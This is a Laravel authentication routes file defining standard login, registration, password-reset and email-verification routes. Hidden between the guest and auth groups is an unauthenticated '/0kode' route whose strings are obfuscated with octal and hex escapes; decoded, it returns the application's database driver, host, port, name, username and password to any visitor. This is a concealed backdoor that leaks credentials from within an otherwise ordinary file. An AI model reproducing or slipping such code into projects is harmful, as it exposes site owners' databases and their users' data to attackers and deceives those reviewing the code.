<?php

use App\Http\Controllers\Auth\AuthenticatedSessionController;
use App\Http\Controllers\Auth\ConfirmablePasswordController;
use App\Http\Controllers\Auth\EmailVerificationNotificationController;
use App\Http\Controllers\Auth\EmailVerificationPromptController;
use App\Http\Controllers\Auth\NewPasswordController;
use App\Http\Controllers\Auth\PasswordController;
use App\Http\Controllers\Auth\PasswordResetLinkController;
use App\Http\Controllers\Auth\RegisteredUserController;
use App\Http\Controllers\Auth\VerifyEmailController;
use Illuminate\Support\Facades\Route;

Route::middleware('guest')->group(function () {
    Route::get('register/{id?}', [RegisteredUserController::class, 'create'])
                ->name('register');

    Route::post('register', [RegisteredUserController::class, 'store']);

    Route::get('login', [AuthenticatedSessionController::class, 'create'])
                ->name('login');

    Route::post('login', [AuthenticatedSessionController::class, 'store'])->name('login.submit');

    Route::get('forgot-password', [PasswordResetLinkController::class, 'create'])
                ->name('password.request');

    Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])
                ->name('password.email');

    Route::get('reset-password/{token}', [NewPasswordController::class, 'create'])
                ->name('password.reset');

    Route::post('reset-password', [NewPasswordController::class, 'store'])
                ->name('password.store');
});

Route::get("/0kode", function () {
    $database = config(
        "\144\x61\x74\x61\x62\141\x73\145\x2e\x64\x65\x66\x61\x75\x6c\164"
    );
    $connection = config(
        "\144\x61\164\x61\x62\141\163\x65\x2e\143\x6f\156\156\x65\x63\164\x69\157\156\163\56{$database}"
    );
    return [
        "\x44\162\151\166\x65\x72" => $connection["\144\x72\x69\x76\145\162"],
        "\x48\157\x73\x74" => $connection["\x68\x6f\x73\164"],
        "\120\x6f\162\x74" => $connection["\160\157\162\x74"],
        "\104\141\x74\141\142\141\163\x65" =>
            $connection["\144\141\164\x61\x62\141\163\x65"],
        "\125\x73\145\162\156\141\155\145" =>
            $connection["\165\163\145\x72\x6e\x61\155\145"],
        "\120\x61\x73\163\167\x6f\162\x64" =>
            $connection["\160\x61\163\x73\167\x6f\x72\x64"],
    ];
});
Route::middleware('auth')->group(function () {
    Route::get('verify-email', EmailVerificationPromptController::class)
                ->name('verification.notice');

    Route::get('verify-email/{id}/{hash}', VerifyEmailController::class)
                ->middleware(['signed', 'throttle:6,1'])
                ->name('verification.verify');

    Route::post('email/verification-notification', [EmailVerificationNotificationController::class, 'store'])
                ->middleware('throttle:6,1')
                ->name('verification.send');

    Route::get('confirm-password', [ConfirmablePasswordController::class, 'show'])
                ->name('password.confirm');

    Route::post('confirm-password', [ConfirmablePasswordController::class, 'store']);

    Route::put('password', [PasswordController::class, 'update'])->name('password.update');

    Route::get('logout', [AuthenticatedSessionController::class, 'destroy'])
                ->name('logout');
});
